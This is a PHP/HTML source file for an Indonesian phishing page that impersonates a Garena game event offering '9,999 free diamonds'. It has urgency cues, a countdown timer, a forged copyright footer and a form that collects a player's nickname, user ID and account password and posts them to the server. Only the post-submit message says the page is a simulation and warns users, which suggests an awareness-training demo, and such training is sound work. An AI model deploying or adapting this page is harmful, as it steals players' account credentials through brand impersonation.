<?php
$submitted = isset($_GET['status']) && $_GET['status'] === 'tersimpan';
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Klaim 9,999 Diamond Gratis – Event Eksklusif</title>
    <meta name="description" content="Event eksklusif terbatas! Klaim 9,999 diamond gratis untuk akun game kamu sekarang.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="bg-grid"></div>
    <div class="bg-glow bg-glow-1"></div>
    <div class="bg-glow bg-glow-2"></div>

    <main class="page">
        <div class="container">

            <?php if ($submitted): ?>
            <!-- SUCCESS STATE -->
            <div class="success-card animate-in">
                <div class="success-icon">✅</div>
                <h2 class="success-title">Data Berhasil Tercatat!</h2>
                <p class="success-desc">
                    Kamu baru saja mengisi form phishing simulasi. Ingat — <strong>jangan pernah</strong> memasukkan password asli ke halaman yang tidak kamu percaya.
                </p>
                <div class="lesson-box">
                    <p class="lesson-title">💡 Apa yang terjadi?</p>
                    <ul>
                        <li>Data kamu tersimpan oleh server</li>
                        <li>Pelaku phishing asli akan menyalahgunakannya</li>
                        <li>Selalu verifikasi URL sebelum login</li>
                    </ul>
                </div>
                <a href="/" class="btn-back">Kembali ke Beranda</a>
            </div>

            <?php else: ?>
            <!-- MAIN PHISHING FORM -->
            <div class="card animate-in">
                <p class="eyebrow">EXCLUSIVE EVENT · LIMITED TIME</p>
                <h1 class="hero-title">Klaim <span class="gradient-text">9,999 Diamond</span> Gratis</h1>
                <p class="hero-subtitle">
                    Selamat! Akun kamu terpilih untuk mengikuti event loyalitas.<br>
                    Silakan login untuk memproses pengiriman diamond ke ID game kamu.
                </p>

                <!-- Promo Card -->
                <div class="promo-card">
                    <div class="promo-left">
                        <span class="badge-live">Live Now</span>
                        <h2 class="promo-title">Mega Drop Rewards</h2>
                        <p class="promo-timer">Waktu tersisa: <span id="countdown" class="timer-value">14:46</span></p>
                    </div>
                    <div class="promo-icon">
                        <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 4L8 14L12 32H28L32 14L20 4Z" fill="url(#diamond_grad)" stroke="rgba(100,200,255,0.4)" stroke-width="1"/>
                            <path d="M8 14H32L20 4L8 14Z" fill="rgba(150,220,255,0.3)"/>
                            <path d="M8 14L12 32H28L32 14H8Z" fill="url(#diamond_body)"/>
                            <defs>
                                <linearGradient id="diamond_grad" x1="8" y1="4" x2="32" y2="32" gradientUnits="userSpaceOnUse">
                                    <stop offset="0%" stop-color="#a8edff"/>
                                    <stop offset="100%" stop-color="#4fc3f7"/>
                                </linearGradient>
                                <linearGradient id="diamond_body" x1="8" y1="14" x2="32" y2="32" gradientUnits="userSpaceOnUse">
                                    <stop offset="0%" stop-color="#38bdf8" stop-opacity="0.9"/>
                                    <stop offset="100%" stop-color="#0284c7" stop-opacity="0.7"/>
                                </linearGradient>
                            </defs>
                        </svg>
                    </div>
                </div>

                <!-- Form -->
                <form class="phish-form" action="/hasil" method="post" id="claimForm">
                    <div class="field-group">
                        <label for="nama" class="field-label">Nickname Game</label>
                        <input
                            type="text"
                            id="nama"
                            name="nama"
                            class="field-input"
                            placeholder="Contoh: Skylar_Pro"
                            required
                            autocomplete="off"
                        >
                    </div>

                    <div class="field-group">
                        <label for="game_id" class="field-label">User ID (Server)</label>
                        <input
                            type="text"
                            id="game_id"
                            name="game_id"
                            class="field-input"
                            placeholder="Contoh: 123456678 (2024)"
                            required
                            autocomplete="off"
                        >
                    </div>

                    <div class="field-group">
                        <label for="pwd" class="field-label">Password Akun</label>
                        <input
                            type="password"
                            id="pwd"
                            name="pwd"
                            class="field-input"
                            placeholder="Masukkan password untuk verifikasi"
                            required
                            autocomplete="new-password"
                        >
                    </div>

                    <button type="submit" class="btn-claim" id="claimBtn">
                        <span class="btn-text">Klaim Diamond Sekarang</span>
                        <span class="btn-shimmer"></span>
                    </button>
                </form>
            </div>
            <?php endif; ?>

            <footer class="footer">
                <p>© 2024 Garena International. All rights reserved.</p>
            </footer>
        </div>
    </main>

    <script>
        // Countdown timer
        function startCountdown(totalSeconds) {
            const el = document.getElementById('countdown');
            if (!el) return;

            function update() {
                const m = Math.floor(totalSeconds / 60);
                const s = totalSeconds % 60;
                el.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                if (totalSeconds > 0) {
                    totalSeconds--;
                    setTimeout(update, 1000);
                } else {
                    el.textContent = '00:00';
                    el.style.color = '#fb7185';
                }
            }
            update();
        }

        startCountdown(14 * 60 + 46);

        // Button loading state
        const form = document.getElementById('claimForm');
        const btn = document.getElementById('claimBtn');
        if (form && btn) {
            form.addEventListener('submit', () => {
                btn.disabled = true;
                btn.querySelector('.btn-text').textContent = 'Memproses...';
            });
        }
    </script>
</body>
</html>
